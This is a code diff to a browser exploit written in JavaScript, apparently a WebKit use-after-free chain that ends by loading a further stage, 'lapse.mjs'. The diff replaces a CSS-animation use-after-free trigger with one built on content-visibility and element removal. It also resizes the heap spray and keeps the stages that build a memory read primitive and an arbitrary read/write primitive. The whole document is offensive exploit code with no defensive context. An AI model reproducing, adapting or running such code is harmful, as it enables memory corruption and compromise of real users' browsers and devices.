@@ -21,7 +21,6 @@ import { KB, MB } from './module/offset.mjs';
 import { BufferView } from './module/rw.mjs';
 import {
     die,
-    DieError,
     log,
     clear_log,
     sleep,
@@ -63,8 +62,8 @@ const ssv_len = (() => {
     }
 })();
 
-const num_reuses = 0x500; // Increased for better memory reuse
-const DELAY = 150; // Adjusted for better timing
+const num_reuses = 10000; // Match PoC heap spray size
+const DELAY = 50; // Adjusted for content-visibility timing
 let attemptCount = 0;
 const fakeStates = []; // Global array to store fake state objects
 const MAX_ATTEMPTS = 5; // Max retry attempts
@@ -90,101 +89,101 @@ function sread64(str, offset) {
 }
 
 function prepare_uaf() {
-    const object = document.createElement('object');
-    object.type = 'image/png';
-    const cite = document.createElement('cite');
-    cite.textContent = 'Exploit Element';
-    const dl = document.createElement('dl');
-    dl.hidden = true;
-    object.appendChild(cite);
-    object.appendChild(dl);
-    document.body.appendChild(object);
-    return object;
+    const container = document.createElement('div');
+    container.className = 'container';
+    const child = document.createElement('div');
+    child.className = 'child';
+    container.appendChild(child);
+    document.body.appendChild(container);
+    return container;
 }
 
-async function uaf_ssv(object) {
+async function uaf_ssv(container) {
     const views = [];
     const status = document.getElementById('status');
     log(`ssv_len: ${hex(ssv_len)}`);
 
     for (let attempt = 0; attempt < MAX_ATTEMPTS; attempt++) {
         attemptCount++;
-        log(`Attempt #${attemptCount}: Initiating CSS Animation UAF...`);
+        log(`Attempt #${attemptCount}: Initiating content-visibility UAF...`);
         status.textContent = `Attempt #${attemptCount} in progress...`;
 
         // Create fake state object
         const fakeState = { data: new ArrayBuffer(ssv_len) };
         fakeStates.push(fakeState);
 
-        object.data = 'x';
-        const citeElement = document.querySelector('cite');
-        citeElement.style.animationIterationCount = 'infinite';
-
-        // Wait for animation to apply
-        await new Promise(resolve => setTimeout(resolve, DELAY));
-
-        const animation = citeElement.getAnimations()[0];
-        if (!animation) {
-            log('No animation found on cite element, retrying...');
-            fakeStates.pop(); // Clean up
+        const childElement = document.querySelector('.child');
+        if (!childElement) {
+            log('Child element not found, retrying...');
+            fakeStates.pop();
             gc();
             await sleep(100);
             continue;
         }
 
-        object.width = '1em';
-        object.codeBase;
+        // Set up MutationObserver
+        const observer = new MutationObserver(() => {
+            log('DOM tree modified, attempting UAF...');
+        });
+
         try {
-            animation.effect = new KeyframeEffect(document.querySelector('dl'), {});
-        } catch (e) {
-            log(`Failed to set KeyframeEffect: ${e.message}, retrying...`);
-            fakeStates.pop(); // Clean up
-            gc();
-            await sleep(100);
-            continue;
-        }
-        gc();
+            observer.observe(container, { childList: true, subtree: true });
 
-        for (let i = 0; i < num_reuses; i++) {
-            const view = new Uint8Array(new ArrayBuffer(ssv_len));
-            view[0] = 0x41;
-            views.push(view);
-        }
+            // Trigger UAF
+            container.style.contentVisibility = 'hidden';
+            childElement.remove();
 
-        log('Checking for UAF memory reuse...');
-        const res = [];
-        for (let i = 0; i < views.length; i++) {
-            const view = views[i];
-            if (view[0] !== 0x41) {
-                log(`view index: ${hex(i)}`);
-                log('found view:');
-                log(view);
+            await new Promise(resolve => setTimeout(resolve, DELAY));
 
-                view[0] = 1;
-                view.fill(0, 1);
+            container.style.contentVisibility = 'auto';
 
-                if (res.length) {
-                    res[1] = [new BufferView(view.buffer), { state: fakeStates[0].data }];
-                    break;
-                }
-
-                res[0] = new BufferView(view.buffer);
-                i = num_reuses - 1;
+            // Heap spray
+            for (let i = 0; i < num_reuses; i++) {
+                const view = new Uint8Array(new ArrayBuffer(ssv_len));
+                view[0] = 0x41;
+                views.push(view);
             }
+
+            log('Checking for UAF memory reuse...');
+            const res = [];
+            for (let i = 0; i < views.length; i++) {
+                const view = views[i];
+                if (view[0] !== 0x41) {
+                    log(`view index: ${hex(i)}`);
+                    log('found view:');
+                    log(view);
+
+                    view[0] = 1;
+                    view.fill(0, 1);
+
+                    if (res.length) {
+                        res[1] = [new BufferView(view.buffer), { state: fakeStates[0].data }];
+                        break;
+                    }
+
+                    res[0] = new BufferView(view.buffer);
+                    i = num_reuses - 1;
+                }
+            }
+
+            if (res.length === 2) {
+                observer.disconnect();
+                return res;
+            }
+
+            log('UAF attempt failed, retrying...');
+        } catch (e) {
+            log(`UAF trigger failed: ${e.message}, retrying...`);
         }
 
-        if (res.length === 2) {
-            return res;
-        }
-
-        log('UAF attempt failed, retrying...');
-        fakeStates.pop(); // Clean up
-        views.length = 0; // Clear views
+        observer.disconnect();
+        fakeStates.pop();
+        views.length = 0;
         gc();
         await sleep(100);
     }
 
-    die('Failed CSS Animation UAF after maximum attempts');
+    die('Failed content-visibility UAF after maximum attempts');
 }
 
 class Reader {
@@ -467,7 +466,7 @@ async function make_arw(reader, view2, pop) {
     log(`fake: [${fake}]`);
 
     const test_val = 3;
-    log(`test setting fake[0] to ${test_val}`);
+    log(`Test setting fake[0] to ${test_val}`);
     fake[0] = test_val;
     if (fake[0] !== test_val) {
         die(`unexpected fake[0]: ${fake[0]}`);
@@ -530,18 +529,22 @@ async function make_arw(reader, view2, pop) {
 }
 
 export async function main() {
-    log('STAGE: UAF CSS Animation');
-    const object = prepare_uaf();
-    const [view, [view2, pop]] = await uaf_ssv(object);
+    log('STAGE: UAF content-visibility');
+    const container = prepare_uaf();
+    const [view, [view2, pop]] = await uaf_ssv(container);
 
     log('STAGE: get string relative read primitive');
     const rdr = await make_rdr(view);
 
-    document.body.removeChild(object);
+    document.body.removeChild(container);
 
     log('STAGE: achieve arbitrary read/write primitive');
     await make_arw(rdr, view2, pop);
 
     clear_log();
-    import('./lapse.mjs');
+    try {
+        await import('./lapse.mjs');
+    } catch (e) {
+        log(`Failed to import lapse.mjs: ${e.message}`);
+    }
 }
